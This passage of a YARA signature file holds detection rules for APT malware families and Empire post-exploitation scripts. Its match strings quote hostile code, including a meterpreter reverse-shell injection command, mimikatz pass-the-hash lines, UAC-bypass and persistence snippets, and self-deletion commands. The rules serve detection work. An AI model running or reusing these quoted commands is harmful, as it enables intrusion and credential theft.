\"[SERVER]connection to %s:%d error\" fullword ascii\n      $s6 = \"[+] Make a Connection to %s:%d....\" fullword ascii\n      $s7 = \"[+] Waiting another Client on port:%d....\" fullword ascii\n      $s8 = \"[+] Accept a Client on port %d from %s\" fullword ascii\n      $s9 = \"[+] Make a Connection to %s:%d ......\" fullword ascii\n      $s10 = \"cmshared_get_ptr_from_atom\" fullword ascii\n      $s11 = \"_cmshared_get_ptr_from_atom\" ascii\n      $s12 = \"[+] OK! I Closed The Two Socket.\" fullword ascii\n      $s13 = \"[-] TransmitPort invalid.\" fullword ascii\n      $s14 = \"[+] Waiting for Client on port:%d ......\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 125KB and 3 of them ) or 5 of them\n}\n\nrule IronPanda_Malware2_RID2DE7 : APT CHINA DEMO EXE FILE {\n   meta:\n      description = \"Iron Panda Malware\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/E4qia9\"\n      date = \"2015-09-16 10:51:41\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, CHINA, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"\\\\setup.exe\" ascii\n      $s1 = \"msi.dll.urlUT\" fullword ascii\n      $s2 = \"msi.dllUT\" fullword ascii\n      $s3 = \"setup.exeUT\" fullword ascii\n      $s4 = \"/c del /q %s\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 180KB and all of them\n}\n\nrule IronPanda_Malware3_RID2DE8 : APT CHINA DEMO EXE FILE {\n   meta:\n      description = \"Iron Panda Malware\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/E4qia9\"\n      date = \"2015-09-16 10:51:51\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, CHINA, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"PluginDeflater.exe\" fullword wide\n      $s1 = \".Deflated\" fullword wide\n      $s2 = \"PluginDeflater\" fullword ascii\n      $s3 = \"DeflateStream\" fullword ascii\n      $s4 = \"CompressionMode\" fullword ascii\n      $s5 = \"System.IO.Compression\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 10KB and all of them\n}\n\nrule IronPanda_Malware4_RID2DE9 : APT CHINA DEMO EXE FILE {\n   meta:\n      description = \"Iron Panda Malware\"\n      author = \"Florian Roth\"\n      reference = \"https://goo.gl/E4qia9\"\n      date = \"2015-09-16 10:52:01\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, CHINA, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"TestPlugin.dll\" fullword wide\n      $s1 = \"<a href='http://www.baidu.com'>aasd</a>\" fullword wide\n      $s2 = \"Zcg.Test.AspxSpyPlugins\" fullword ascii\n      $s6 = \"TestPlugin\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 10KB and all of them\n}\n\nrule MAL_APT_RocketKitten_Keylogger_RID326D : APT DEMO EXE FILE G0130 MAL MIDDLE_EAST T1056_001 {\n   meta:\n      description = \"Detects Keylogger used in Rocket Kitten APT\"\n      author = \"Florian Roth\"\n      reference = \"https://www.trendmicro.com/vinfo/us/security/news/cyber-attacks/rocket-kitten-continues-attacks-on-middle-east-targets\"\n      date = \"2015-09-01 14:04:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2024-07-19\"\n      hash1 = \"1c9e519dca0468a87322bebe2a06741136de7969a4eb3efda0ab8db83f0807b4\"\n      hash2 = \"495a15f9f30d6f6096a97c2bd8cc5edd4d78569b8d541b1d5a64169f8109bc5b\"\n      hash3 = \"5dcc91911ea6c80508a2785ea94cce1f1a41b6362b094552e8494d655ea04e72\"\n      tags = \"APT, DEMO, EXE, FILE, G0130, MAL, MIDDLE_EAST, T1056_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"\\\\Release\\\\CWoolger.pdb\" ascii\n      $x2 = \"WoolenLoger\\\\obj\\\\x86\\\\Release\" ascii\n      $x3 = \"D:\\\\Yaser Logers\\\\\" \n      $z1 = \"woolger\" fullword wide\n      $s1 = \"oShellLink.TargetPath = \\\"\" fullword ascii\n      $s2 = \"wscript.exe \" fullword ascii\n      $s3 = \"strSTUP = WshShell.SpecialFolders(\\\"Startup\\\")\" fullword ascii\n      $s4 = \"[CapsLock]\" fullword ascii\n   condition: \n      ( uint16 ( 0 ) == 0x5a4d and filesize < 200KB and ( 1 of ( $x* ) or ( $z1 and 2 of ( $s* ) ) ) ) or ( $z1 and all of ( $s* ) )\n}\n\nrule MAL_Korplug_FAST_RID2CBB : DEMO EXE FILE MAL T1218_011 {\n   meta:\n      description = \"Rule to detect Korplug/PlugX FAST variant\"\n      author = \"Florian Roth\"\n      reference = \"-\"\n      date = \"2015-08-20 10:01:41\"\n      score = 75\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, EXE, FILE, MAL, T1218_011\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"%s\\\\rundll32.exe \\\"%s\\\", ShadowPlay\" fullword ascii\n      $a1 = \"ShadowPlay\" fullword ascii\n      $s1 = \"%s\\\\rundll32.exe \\\"%s\\\",\" fullword ascii\n      $s2 = \"nvdisps.dll\" fullword ascii\n      $s3 = \"%snvdisps.dll\" fullword ascii\n      $s4 = \"\\\\winhlp32.exe\" ascii\n      $s5 = \"nvdisps_user.dat\" fullword ascii\n      $s6 = \"%snvdisps_user.dat\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 500KB and ( $x1 or ( $a1 and 1 of ( $s* ) ) or 4 of ( $s* ) )\n}\n\nrule MAL_Emdivi_SFX_RID2BF8 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Emdivi malware in SFX Archive\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/blog/research/71876/new-activity-of-the-blue-termite-apt/\"\n      date = \"2015-08-20 09:29:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"7a3c81b2b3c14b9cd913692347019887b607c54152b348d6d3ccd3ecfd406196\"\n      hash2 = \"8c3df4e4549db3ce57fc1f7b1b2dfeedb7ba079f654861ca0b608cbfa1df0f6b\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Setup=unsecess.exe\" fullword ascii\n      $x2 = \"Setup=leassnp.exe\" fullword ascii\n      $s1 = \"&Enter password for the encrypted file:\" fullword wide\n      $s2 = \";The comment below contains SFX script commands\" fullword ascii\n      $s3 = \"Path=%temp%\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 740KB and ( 1 of ( $x* ) and all of ( $s* ) )\n}\n\nrule MAL_Emdivi_Gen3_RID2C54 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Emdivi Malware\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/blog/research/71876/new-activity-of-the-blue-termite-apt/\"\n      date = \"2015-08-20 09:44:31\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      modified = \"2023-01-06\"\n      hash1 = \"008f4f14cf64dc9d323b6cb5942da4a99979c4c7d750ec1228d8c8285883771e\"\n      hash2 = \"a94bf485cebeda8e4b74bbe2c0a0567903a13c36b9bf60fab484a9b55207fe0d\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727.42)\" fullword ascii\n      $s2 = \"\\\\Mozilla\\\\Firefox\\\\Profiles\\\\\" ascii\n      $s4 = \"\\\\auto.cfg\" ascii\n      $s5 = \"/ncsi.txt\" fullword ascii\n      $s6 = \"/en-us/default.aspx\" fullword ascii\n      $s7 = \"cmd /c\" fullword ascii\n      $s9 = \"APPDATA\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 850KB and ( ( $x1 and 1 of ( $s* ) ) or ( 4 of ( $s* ) ) )\n}\n\nrule MAL_Emdivi_Gen4_RID2C55 : DEMO EXE FILE MAL {\n   meta:\n      description = \"Detects Emdivi Malware\"\n      author = \"Florian Roth\"\n      reference = \"https://securelist.com/blog/research/71876/new-activity-of-the-blue-termite-apt/\"\n      date = \"2015-08-20 09:44:41\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"008f4f14cf64dc9d323b6cb5942da4a99979c4c7d750ec1228d8c8285883771e\"\n      hash2 = \"17e646ca2558a65ffe7aa185ba75d5c3a573c041b897355c2721e9a8ca5fee24\"\n      hash3 = \"3553c136b4eba70eec5d80abe44bd7c7c33ab1b65de617dbb7be5025c9cf01f1\"\n      tags = \"DEMO, EXE, FILE, MAL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \".http_port\\\", \" fullword wide\n      $s2 = \"UserAgent: \" fullword ascii\n      $s3 = \"AUTH FAILED\" fullword ascii\n      $s4 = \"INVALID FILE PATH\" fullword ascii\n      $s5 = \".autoconfig_url\\\", \\\"\" fullword wide\n      $s6 = \"FAILED TO WRITE FILE\" fullword ascii\n      $s7 = \".proxy\" fullword wide\n      $s8 = \"AuthType: \" fullword ascii\n      $s9 = \".no_proxies_on\\\", \\\"\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 853KB and all of them\n}\n\nrule CheshireCat_Sample2_RID2E47 : APT DEMO EXE FILE {\n   meta:\n      description = \"Semiautomatically generated YARA rule\"\n      author = \"Florian Roth\"\n      reference = \"https://malware-research.org/prepare-father-of-stuxnet-news-are-coming/\"\n      date = \"2015-08-08 11:07:41\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"mpgvwr32.dll\" fullword ascii\n      $s1 = \"Unexpected failure of wait! (%d)\" fullword ascii\n      $s2 = \"\\\"%s\\\" /e%d /p%s\" fullword ascii\n      $s4 = \"error in params!\" fullword ascii\n      $s5 = \"sscanf\" fullword ascii\n      $s6 = \"<>Param : 0x%x\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and 4 of ( $s* )\n}\n\nrule CheshireCat_Gen2_RID2CFF : APT DEMO EXE FILE {\n   meta:\n      description = \"Semiautomatically generated YARA rule\"\n      author = \"Florian Roth\"\n      reference = \"https://malware-research.org/prepare-father-of-stuxnet-news-are-coming/\"\n      date = \"2015-08-08 10:13:01\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"ec41b029c3ff4147b6a5252cb8b659f851f4538d4af0a574f7e16bc1cd14a300\"\n      hash2 = \"32159d2a16397823bc882ddd3cd77ecdbabe0fde934e62f297b8ff4d7b89832a\"\n      hash3 = \"63735d555f219765d486b3d253e39bd316bbcb1c0ec595ea45ddf6e419bef3cb\"\n      tags = \"APT, DEMO, EXE, FILE\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $a1 = \"Interface\\\\%s\\\\info\" fullword ascii\n      $a2 = \"Interface\\\\%s\\\\info\\\\%s\" fullword ascii\n      $a3 = \"CLSID\\\\%s\\\\info\\\\%s\" fullword ascii\n      $a4 = \"CLSID\\\\%s\\\\info\" fullword ascii\n      $b1 = \"Windows Shell Icon Handler\" fullword wide\n      $b2 = \"Microsoft Shell Icon Handler\" fullword wide\n      $s1 = \"\\\\StringFileInfo\\\\%s\\\\FileVersion\" ascii\n      $s2 = \"CLSID\\\\%s\\\\AuxCLSID\" fullword ascii\n      $s3 = \"lnkfile\\\\shellex\\\\IconHandler\" fullword ascii\n      $s4 = \"%s: %s, %.2hu %s %hu %2.2hu:%2.2hu:%2.2hu GMT\" fullword ascii\n      $s5 = \"%sMutex\" fullword ascii\n      $s6 = \"\\\\ShellIconCache\" ascii\n      $s7 = \"+6Service Pack \" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 200KB and 7 of ( $s* ) and 2 of ( $a* ) and 1 of ( $b* )\n}\n\nrule HttpBrowser_RAT_dropper_Gen1_RID31E0 : APT DEMO EXE FILE G0027 T1574_001 {\n   meta:\n      description = \"Threat Group 3390 APT Sample - HttpBrowser RAT Dropper\"\n      author = \"Florian Roth\"\n      reference = \"http://snip.ly/giNB\"\n      date = \"2015-08-06 13:41:11\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"808de72f1eae29e3c1b2c32be1b84c5064865a235866edf5e790d2a7ba709907\"\n      hash2 = \"f6f966d605c5e79de462a65df437ddfca0ad4eb5faba94fc875aba51a4b894a7\"\n      hash3 = \"f424965a35477d822bbadb821125995616dc980d3d4f94a68c87d0cd9b291df9\"\n      tags = \"APT, DEMO, EXE, FILE, G0027, T1574_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $x1 = \"1001=cmd.exe\" fullword ascii\n      $x2 = \"1003=ShellExecuteA\" fullword ascii\n      $x3 = \"1002=/c del /q %s\" fullword ascii\n      $x4 = \"1004=SetThreadPriority\" fullword ascii\n      $op0 = { e8 71 11 00 00 83 c4 10 ff 4d e4 8b f0 78 07 8b } \n      $op1 = { e8 85 34 00 00 59 59 8b 86 b4 } \n      $op2 = { 8b 45 0c 83 38 00 0f 84 97 } \n      $op3 = { 8b 45 0c 83 38 00 0f 84 98 } \n      $op4 = { 89 7e 0c ff 15 a0 50 40 00 59 8b d8 6a 20 59 8d } \n      $op5 = { 56 8d 85 cd fc ff ff 53 50 88 9d cc fc ff ff e8 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and all of ( $x* ) and 1 of ( $op* )\n}\n\nrule HttpBrowser_RAT_Sample1_RID2FCD : APT DEMO EXE FILE G0027 T1574_001 {\n   meta:\n      description = \"Threat Group 3390 APT Sample - HttpBrowser RAT Sample update.hancominc.com\"\n      author = \"Florian Roth\"\n      reference = \"http://snip.ly/giNB\"\n      date = \"2015-08-06 12:12:41\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"be334d1f8fa65a723af65200a166c2bbdb06690c8b30fafe772600e4662fc68b\"\n      hash2 = \"1052ad7f4d49542e4da07fa8ea59c15c40bc09a4d726fad023daafdf05866ebb\"\n      tags = \"APT, DEMO, EXE, FILE, G0027, T1574_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"update.hancominc.com\" fullword wide\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 100KB and $s0\n}\n\nrule HttpBrowser_RAT_Sample2_RID2FCE : APT DEMO EXE FILE G0027 T1574_001 {\n   meta:\n      description = \"Threat Group 3390 APT Sample - HttpBrowser RAT Sample\"\n      author = \"Florian Roth\"\n      reference = \"http://snip.ly/giNB\"\n      date = \"2015-08-06 12:12:51\"\n      score = 80\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"c57c5a2c322af2835ae136b75283eaaeeaa6aa911340470182a9983ae47b8992\"\n      tags = \"APT, DEMO, EXE, FILE, G0027, T1574_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"nKERNEL32.DLL\" fullword wide\n      $s1 = \"WUSER32.DLL\" fullword wide\n      $s2 = \"mscoree.dll\" fullword wide\n      $s3 = \"VPDN_LU.exeUT\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 250KB and all of them\n}\n\nrule HttpBrowser_RAT_Gen_RID2E54 : APT DEMO EXE FILE G0027 GEN T1574_001 {\n   meta:\n      description = \"Threat Group 3390 APT Sample - HttpBrowser RAT Generic\"\n      author = \"Florian Roth\"\n      reference = \"http://snip.ly/giNB\"\n      date = \"2015-08-06 11:09:51\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"0299493ccb175d452866f5e21d023d3e92cd8d28452517d1d19c0f05f2c5ca27\"\n      hash2 = \"065d055a90da59b4bdc88b97e537d6489602cb5dc894c5c16aff94d05c09abc7\"\n      hash3 = \"05c7291db880f94c675eea336ecd66338bd0b1d49ad239cc17f9df08106e6684\"\n      tags = \"APT, DEMO, EXE, FILE, G0027, GEN, T1574_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"%d|%s|%04d/%02d/%02d %02d:%02d:%02d|%ld|%d\" fullword wide\n      $s1 = \"HttpBrowser/1.0\" fullword wide\n      $s2 = \"set cmd : %s\" ascii fullword\n      $s3 = \"\\\\config.ini\" wide fullword\n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 45KB and filesize > 20KB and all of them\n}\n\nrule PlugX_NvSmartMax_Gen_RID2ECA : APT DEMO EXE FILE G0027 GEN {\n   meta:\n      description = \"Threat Group 3390 APT Sample - PlugX NvSmartMax Generic\"\n      author = \"Florian Roth\"\n      reference = \"http://snip.ly/giNB\"\n      date = \"2015-08-06 11:29:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"718fc72942b9b706488575c0296017971170463f6f40fa19b08fc84b79bf0cef\"\n      hash2 = \"1c0379481d17fc80b3330f148f1b87ff613cfd2a6601d97920a0bcd808c718d0\"\n      hash3 = \"555952aa5bcca4fa5ad5a7269fece99b1a04816d104ecd8aefabaa1435f65fa5\"\n      tags = \"APT, DEMO, EXE, FILE, G0027, GEN\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"NvSmartMax.dll\" fullword ascii\n      $s1 = \"NvSmartMax.dll.url\" fullword ascii\n      $s2 = \"Nv.exe\" fullword ascii\n      $s4 = \"CryptProtectMemory failed\" fullword ascii\n      $s5 = \"CryptUnprotectMemory failed\" fullword ascii\n      $s7 = \"r%.*s(%d)%s\" fullword wide\n      $s8 = \" %s CRC \" fullword wide\n      $op0 = { c6 05 26 49 42 00 01 eb 4a 8d 85 00 f8 ff ff 50 } \n      $op1 = { 8d 85 c8 fe ff ff 50 8d 45 c8 50 c6 45 47 00 e8 } \n      $op2 = { e8 e6 65 00 00 50 68 10 43 41 00 e8 56 84 00 00 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 800KB and all of ( $s* ) and 1 of ( $op* )\n}\n\nrule HttpBrowser_RAT_dropper_Gen2_RID31E1 : APT DEMO EXE FILE G0027 T1574_001 {\n   meta:\n      description = \"Threat Group 3390 APT Sample - HttpBrowser RAT Dropper\"\n      author = \"Florian Roth\"\n      reference = \"http://snip.ly/giNB\"\n      date = \"2015-08-06 13:41:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      hash1 = \"c57c5a2c322af2835ae136b75283eaaeeaa6aa911340470182a9983ae47b8992\"\n      hash2 = \"dfa984174268a9f364d856fd47cfaca75804640f849624d69d81fcaca2b57166\"\n      tags = \"APT, DEMO, EXE, FILE, G0027, T1574_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"navlu.dll.urlUT\" fullword ascii\n      $s2 = \"VPDN_LU.exeUT\" fullword ascii\n      $s3 = \"pnipcn.dllUT\" fullword ascii\n      $s4 = \"\\\\ssonsvr.exe\" ascii\n      $s5 = \"/c del /q %s\" fullword ascii\n      $s6 = \"\\\\setup.exe\" ascii\n      $s7 = \"msi.dllUT\" fullword ascii\n      $op0 = { 8b 45 0c 83 38 00 0f 84 98 } \n      $op1 = { e8 dd 07 00 00 ff 35 d8 fb 40 00 8b 35 7c a0 40 } \n      $op2 = { 83 fb 08 75 2c 8b 0d f8 af 40 00 89 4d dc 8b 0d } \n      $op3 = { c7 43 18 8c 69 40 00 e9 da 01 00 00 83 7d f0 00 } \n      $op4 = { 6a 01 e9 7c f8 ff ff bf 1a 40 00 96 1b 40 00 01 } \n   condition: \n      uint16 ( 0 ) == 0x5a4d and filesize < 400KB and 3 of ( $s* ) and 1 of ( $op* )\n}\n\nrule Empire_Invoke_BypassUAC_RID2FE8 : DEMO SCRIPT SUSP T1059_001 {\n   meta:\n      description = \"Empire - a pure PowerShell post-exploitation agent - file Invoke-BypassUAC.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/PowerShellEmpire/Empire\"\n      date = \"2015-08-06 12:17:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, SUSP, T1059_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"$WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll WriteProcessMemory\" fullword ascii\n      $s2 = \"$proc = Start-Process -WindowStyle Hidden notepad.exe -PassThru\" fullword ascii\n      $s3 = \"$Payload = Invoke-PatchDll -DllBytes $Payload -FindString \\\"ExitThread\\\" -ReplaceString \\\"ExitProcess\\\"\" fullword ascii\n      $s4 = \"$temp = [System.Text.Encoding]::UNICODE.GetBytes($szTempDllPath)\" fullword ascii\n   condition: \n      filesize < 1200KB and 3 of them\n}\n\nrule Empire_lib_modules_trollsploit_message_RID36CC : DEMO SCRIPT SUSP T1059_001 {\n   meta:\n      description = \"Empire - a pure PowerShell post-exploitation agent - file message.py\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/PowerShellEmpire/Empire\"\n      date = \"2015-08-06 17:11:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, SUSP, T1059_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"script += \\\" -\\\" + str(option) + \\\" \\\\\\\"\\\" + str(values['Value'].strip(\\\"\\\\\\\"\\\")) + \\\"\\\\\\\"\\\"\" fullword ascii\n      $s2 = \"if option.lower() != \\\"agent\\\" and option.lower() != \\\"computername\\\":\" fullword ascii\n      $s3 = \"[String] $Title = 'ERROR - 0xA801B720'\" fullword ascii\n      $s4 = \"'Value'         :   'Lost contact with the Domain Controller.'\" fullword ascii\n   condition: \n      filesize < 10KB and 3 of them\n}\n\nrule Empire_Persistence_RID2E57 : DEMO SCRIPT SUSP T1059_001 {\n   meta:\n      description = \"Empire - a pure PowerShell post-exploitation agent - file Persistence.psm1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/PowerShellEmpire/Empire\"\n      date = \"2015-08-06 11:10:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, SUSP, T1059_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"C:\\\\PS>Add-Persistence -ScriptBlock $RickRoll -ElevatedPersistenceOption $ElevatedOptions -UserPersistenceOption $UserOptions -V\" ascii\n      $s2 = \"# Execute the following to remove the user-level persistent payload\" fullword ascii\n      $s3 = \"$PersistantScript = $PersistantScript.ToString().Replace('EXECUTEFUNCTION', \\\"$PersistenceScriptName -Persist\\\")\" fullword ascii\n   condition: \n      filesize < 108KB and 1 of them\n}\n\nrule Empire_portscan_RID2D3C : DEMO SCRIPT SUSP T1059_001 {\n   meta:\n      description = \"Empire - a pure PowerShell post-exploitation agent - file portscan.py\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/PowerShellEmpire/Empire\"\n      date = \"2015-08-06 10:23:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, SUSP, T1059_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"script += \\\"Invoke-PortScan -noProgressMeter -f\\\"\" fullword ascii\n      $s2 = \"script += \\\" | ? {$_.alive}| Select-Object HostName,@{name='OpenPorts';expression={$_.openPorts -join ','}} | ft -wrap | Out-Str\" ascii\n   condition: \n      filesize < 14KB and all of them\n}\n\nrule Empire_Invoke_Shellcode_RID3030 : DEMO SCRIPT SUSP T1059_001 {\n   meta:\n      description = \"Empire - a pure PowerShell post-exploitation agent - file Invoke-Shellcode.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/PowerShellEmpire/Empire\"\n      date = \"2015-08-06 12:29:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, SUSP, T1059_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"C:\\\\PS> Invoke-Shellcode -ProcessId $Proc.Id -Payload windows/meterpreter/reverse_https -Lhost 192.168.30.129 -Lport 443 -Verbos\" ascii\n      $s2 = \"\\\"Injecting shellcode injecting into $((Get-Process -Id $ProcessId).ProcessName) ($ProcessId)!\\\" ) )\" fullword ascii\n      $s3 = \"$RemoteMemAddr = $VirtualAllocEx.Invoke($hProcess, [IntPtr]::Zero, $Shellcode.Length + 1, 0x3000, 0x40) # (Reserve|Commit, RWX)\" fullword ascii\n   condition: \n      filesize < 100KB and 1 of them\n}\n\nrule Empire_Invoke_Mimikatz_1_RID3073 : DEMO S0002 SCRIPT SUSP T1003 T1059_001 T1134_005 T1550_002 T1550_003 {\n   meta:\n      description = \"Empire - a pure PowerShell post-exploitation agent - file Invoke-Mimikatz.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/PowerShellEmpire/Empire\"\n      date = \"2015-08-06 12:40:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, S0002, SCRIPT, SUSP, T1003, T1059_001, T1134_005, T1550_002, T1550_003\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"$PEBytes64 = \\\"TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA+AAAAA4fug4AtAnNIbgBTM0hVGhpcyBwc\" ascii\n      $s2 = \"[System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineAArgsPtr, $GetCommandLineAAddrTemp, $false)\" fullword ascii\n      $s3 = \"Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineWAddrTemp\" fullword ascii\n   condition: \n      filesize < 2500KB and 2 of them\n}\n\nrule Empire_lib_modules_credentials_mimikatz_pth_RID38BE : DEMO S0002 SCRIPT SUSP T1003 T1059_001 T1134_005 T1550_002 T1550_003 {\n   meta:\n      description = \"Empire - a pure PowerShell post-exploitation agent - file pth.py\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/PowerShellEmpire/Empire\"\n      date = \"2015-08-06 18:34:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, S0002, SCRIPT, SUSP, T1003, T1059_001, T1134_005, T1550_002, T1550_003\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"(credID, credType, domainName, userName, password, host, sid, notes) = self.mainMenu.credentials.get_credentials(credID)[0]\" fullword ascii\n      $s1 = \"command = \\\"sekurlsa::pth /user:\\\"+self.options[\\\"user\\\"]['Value']\" fullword ascii\n   condition: \n      filesize < 12KB and all of them\n}\n\nrule Empire_Write_HijackDll_RID2FA2 : DEMO SCRIPT SUSP T1059_001 {\n   meta:\n      description = \"Empire - a pure PowerShell post-exploitation agent - file Write-HijackDll.ps1\"\n      author = \"Florian Roth\"\n      reference = \"https://github.com/PowerShellEmpire/Empire\"\n      date = \"2015-08-06 12:05:31\"\n      score = 90\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      \n      tags = \"DEMO, SCRIPT, SUSP, T1059_001\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"$DllBytes = Invoke-PatchDll -DllBytes $DllBytes -FindString \\\"debug.bat\\\" -ReplaceString $BatchPath\" fullword ascii\n      $s2 = \"$DllBytes32 = \\\"TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA4AAAAA4fug4AtAnNIbgBTM0hVGhpcyBw\" ascii\n      $s3 = \"[Byte[]]$DllBytes = [Byte[]][Convert]::FromBase64String($DllBytes32)\" fullword ascii\n   condition: \n      filesize < 500KB and 2 of them\n}\n\nrule Empire_skeleton_key_RID2EDF : DEMO SCRIPT SUSP T1059_001 T1098_004 T1547_008 {\n   meta:\n      description = \"Empire - a pure PowerShell post-exploitation agent - file skeleton_key.py\"\n      author = 